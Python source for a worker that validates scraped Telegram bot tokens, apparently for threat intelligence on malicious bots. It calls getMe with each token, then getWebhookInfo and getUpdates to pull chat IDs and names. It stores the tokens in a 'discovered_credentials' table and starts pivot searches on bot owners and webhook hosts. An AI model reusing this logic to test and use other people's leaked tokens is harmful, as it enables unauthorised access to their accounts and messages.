"""
Token validation worker — async validation off the scanner critical path.

Architecture:
    Scanner finds N tokens → enqueues N `validation.validate_token` tasks.
    Dedicated `worker-validators` pulls them off the `validation` queue with
    a Redis-backed global token bucket rate limiter (1 getMe per N seconds
    across ALL validator workers, not per-batch).

Why:
    Old design ran validation INSIDE scanner tasks with VALIDATE_BATCH_CAP=50.
    Result sets > 50 dropped tokens silently, scanner runs took 10-15 min
    blocking the queue, and burst getMe calls triggered Telegram per-IP
    secondary rate limits that cascaded into bot_restricted cooldowns.

Rate limiter:
    Redis key `rate_limit:telegram_getMe` — incremented atomically.
    If TTL is unset (first call in window), set to RATE_WINDOW_SECONDS.
    If counter > RATE_MAX_CALLS, sleep until window expires + retry.
    Default: 30 calls / 10 seconds = ~3 calls/sec (well below Telegram's
    ~30 calls/sec per-IP soft limit but high enough not to bottleneck).
"""
import asyncio
import hashlib
import logging
import os
import time

import httpx

from app.core.config import settings
from app.core.database import db
from app.core.security import security
from app.services.scanners import _is_valid_token
from app.workers.celery_app import app
from app.workers.tasks.flow_tasks import async_execute, redis_client


logger = logging.getLogger("validation.tasks")
logger.setLevel(logging.INFO)


# ============================================
# RATE LIMITER (Redis token bucket — global across all validator workers)
# ============================================

RATE_LIMIT_KEY = "rate_limit:telegram_getMe"
RATE_MAX_CALLS = int(os.getenv("VALIDATE_RATE_MAX", 30))      # 30 calls...
RATE_WINDOW_SECONDS = int(os.getenv("VALIDATE_RATE_WINDOW", 10))  # ...per 10s
RATE_MAX_WAIT = float(os.getenv("VALIDATE_RATE_MAX_WAIT", 30.0))  # cap blocking time


async def _acquire_rate_token() -> None:
    """
    Atomic token-bucket acquire backed by Redis.

    Uses pipelined INCR + EXPIRE — first call in the window sets TTL.
    If counter exceeds RATE_MAX_CALLS, sleeps until window expires and retries.

    Caps total wait at RATE_MAX_WAIT to avoid worker hangs on rate-storm.
    """
    deadline = time.monotonic() + RATE_MAX_WAIT
    while True:
        # Atomic INCR + conditional EXPIRE
        pipe = redis_client.pipeline()
        pipe.incr(RATE_LIMIT_KEY)
        pipe.ttl(RATE_LIMIT_KEY)
        count, ttl = pipe.execute()

        # First call in window — set TTL
        if ttl < 0:
            redis_client.expire(RATE_LIMIT_KEY, RATE_WINDOW_SECONDS)
            ttl = RATE_WINDOW_SECONDS

        if count <= RATE_MAX_CALLS:
            return

        # Over budget — sleep until window expires (TTL seconds + jitter)
        sleep_for = max(ttl, 1) + 0.5
        if time.monotonic() + sleep_for > deadline:
            logger.warning(
                f"[RateLimit] Wait would exceed {RATE_MAX_WAIT}s cap "
                f"(count={count}, ttl={ttl}s) — proceeding anyway"
            )
            return
        logger.debug(f"[RateLimit] Over budget ({count}/{RATE_MAX_CALLS}), sleeping {sleep_for}s")
        await asyncio.sleep(sleep_for)


def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()


# ============================================
# VALIDATION TASK
# ============================================

@app.task(
    name="validation.validate_token",
    queue="validation",
    autoretry_for=(httpx.RequestError,),
    retry_backoff=True,
    max_retries=3,
    rate_limit="60/m",  # belt-and-braces: Celery-side per-worker cap
)
def validate_token(item: dict, source_name: str):
    """
    Validate a single token from a scanner result.

    Args:
        item: dict with at least {"token": str}, optionally {"chat_id", "meta"}
        source_name: scanner that found this token (for provenance)
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_validate_token_async(item, source_name))


async def _validate_token_async(item: dict, source_name: str) -> int:
    """Returns 1 if saved/updated, 0 otherwise."""
    token = item.get("token")
    if not token or token == "MANUAL_REVIEW_REQUIRED":
        return 0

    # Step 1: Format check (cheap — do BEFORE rate-limiting)
    if not _is_valid_token(token):
        logger.debug(f"[Validate] Invalid format: {token[:15]}...")
        return 0

    token_hash = _calculate_hash(token)
    extracted_chat_id = item.get("chat_id")

    try:
        # Step 2: Dedupe check — skip if already exists with chat_id
        existing = await async_execute(
            db.table("discovered_credentials")
            .select("id, chat_id, meta")
            .eq("token_hash", token_hash)
        )
        existing_id = None
        existing_meta = {}
        existing_has_chat = False
        if existing.data:
            existing_id = existing.data[0]["id"]
            existing_meta = existing.data[0].get("meta") or {}
            existing_has_chat = existing.data[0].get("chat_id") is not None
            if existing_has_chat:
                logger.debug(f"[Validate] Token {token[:10]}... already has chat_id, skipping")
                return 0

        # Step 3: Rate-limited getMe (the expensive call)
        await _acquire_rate_token()

        async with httpx.AsyncClient(timeout=10.0) as client:
            base_url = f"https://api.telegram.org/bot{token}"
            me_data = None
            me_res = None
            for attempt in range(2):
                try:
                    me_res = await client.get(f"{base_url}/getMe")
                    me_data = me_res.json()
                    if me_res.status_code == 200 and me_data.get("ok"):
                        break
                except Exception:
                    if attempt == 0:
                        await asyncio.sleep(1)
                    continue

            if not me_res or me_res.status_code != 200 or not me_data.get("ok"):
                logger.debug(
                    f"[Validate] Token invalid (HTTP {me_res.status_code if me_res else 'timeout'})"
                )
                return 0

            bot_info = me_data.get("result", {})
            bot_username = bot_info.get("username", "unknown")
            logger.info(f"[Validate] ✅ @{bot_username} (id={bot_info.get('id')})")

            # ---- Bundle 1.4: getWebhookInfo (capture C2 host if set) ----
            webhook_url = None
            try:
                wh_res = await client.get(f"{base_url}/getWebhookInfo", timeout=5.0)
                if wh_res.status_code == 200:
                    wh_data = wh_res.json()
                    if wh_data.get("ok"):
                        webhook_url = (wh_data.get("result") or {}).get("url") or None
                        if webhook_url:
                            logger.info(f"[Validate] 🪝 webhook → {webhook_url[:80]}")
            except Exception:
                pass  # webhook info is bonus; never block the main path

            # ---- Bundle 1: Pivot fan-out (fire-and-forget) ----
            try:
                from app.workers.tasks.pivot_tasks import (
                    search_github_user,
                    search_bot_username,
                    search_webhook_host,
                )
                # Seed 1: GitHub owner (if source meta carries repo)
                meta_in = item.get("meta") or {}
                repo = meta_in.get("repo")  # format "owner/repo"
                if repo and "/" in repo:
                    owner = repo.split("/")[0]
                    if owner:
                        search_github_user.apply_async(args=[owner], queue="validation")

                # Seed 2: Bot @username (always available from getMe)
                if bot_username and bot_username != "unknown":
                    search_bot_username.apply_async(args=[bot_username], queue="validation")

                # Seed 3: Webhook host (only if set)
                if webhook_url:
                    search_webhook_host.apply_async(args=[webhook_url], queue="validation")
            except Exception as e:
                # Pivot failure must NEVER block the main validation pipeline
                logger.debug(f"[Validate] Pivot fan-out failed (non-fatal): {e}")

            # Step 4: Resolve chat_id (extracted > getUpdates > none)
            chat_id = extracted_chat_id
            chat_name = None
            chat_type = None

            if not chat_id:
                from app.services.scraper_srv import scraper_service as _scraper_srv
                if not _scraper_srv.is_monitor_bot(token):
                    try:
                        # getUpdates also counts toward rate budget
                        await _acquire_rate_token()
                        upd_res = await client.get(
                            f"{base_url}/getUpdates", params={"limit": 10}
                        )
                        if upd_res.status_code == 200 and upd_res.json().get("ok"):
                            for update in upd_res.json().get("result", []):
                                for key in ["message", "channel_post", "my_chat_member"]:
                                    if key in update and update[key].get("chat"):
                                        chat = update[key]["chat"]
                                        chat_id = chat.get("id")
                                        chat_name = (
                                            chat.get("title")
                                            or chat.get("username")
                                            or chat.get("first_name")
                                        )
                                        chat_type = chat.get("type")
                                        break
                                if chat_id:
                                    break
                    except Exception as e:
                        logger.warning(f"[Validate] getUpdates failed: {e}")

        # Step 5: Persist (UPDATE existing or INSERT new)
        if existing_id and chat_id:
            # Update existing — stored meta wins to preserve enrichment
            merged_meta = {
                **item.get("meta", {}),
                **existing_meta,
                "last_seen_source": source_name,
                "last_verified_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
            }
            if webhook_url:
                merged_meta["webhook_url"] = webhook_url
            update_data = {
                "chat_id": chat_id,
                "status": "active",
                "meta": merged_meta,
            }
            if chat_name:
                update_data["chat_name"] = chat_name
            if chat_type:
                update_data["chat_type"] = chat_type
            await async_execute(
                db.table("discovered_credentials").update(update_data).eq("id", existing_id)
            )
            logger.info(f"[Validate] 🆙 Updated {existing_id} with chat_id {chat_id}")
            return 1

        if existing_id and not chat_id:
            # Re-queue enrichment with cooldown (per BUG-010)
            from app.core.redis_srv import redis_srv
            cooldown_key = f"enrich_requeue:{existing_id}"
            if not redis_srv.is_on_cooldown(cooldown_key):
                from app.workers.tasks.flow_tasks import enrich_credential
                enrich_credential.delay(existing_id)
                redis_srv.set_cooldown(cooldown_key, 3600)
            return 0

        # New record
        new_data = {
            "bot_token": security.encrypt(token),
            "token_hash": token_hash,
            "chat_id": chat_id,
            "chat_name": chat_name,
            "chat_type": chat_type,
            "bot_id": str(bot_info.get("id")),
            "bot_username": bot_username,
            "source": source_name,
            "status": "pending" if not chat_id else "active",
            "meta": {
                **item.get("meta", {}),
                "bot_username": bot_username,
                "bot_id": bot_info.get("id"),
                "chat_name": chat_name,
                "chat_type": chat_type,
                **({"webhook_url": webhook_url} if webhook_url else {}),
            },
        }
        res = await async_execute(db.table("discovered_credentials").insert(new_data))
        if res.data:
            new_id = res.data[0]["id"]
            status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"

            from app.workers.tasks.flow_tasks import get_broadcaster, enrich_credential
            await get_broadcaster().send_log(
                f"🎯 [{source_name}] **New Bot Token!**\n"
                f"Bot: @{bot_username}\n"
                f"ID: `{new_id}`\n"
                f"Status: {status_label}"
            )
            enrich_credential.delay(new_id)
            return 1

    except Exception as e:
        # Race condition: two validators raced on the same token, second
        # hit unique-constraint violation. Benign — first won, this is a no-op.
        # Postgres code 23505 = unique_violation.
        err_str = str(e)
        if "23505" in err_str or "duplicate key" in err_str.lower():
            logger.debug(f"[Validate] Duplicate token (raced): {token[:10]}... — first writer won")
            return 0
        logger.error(f"[Validate] Error processing token: {e}", exc_info=True)

    return 0
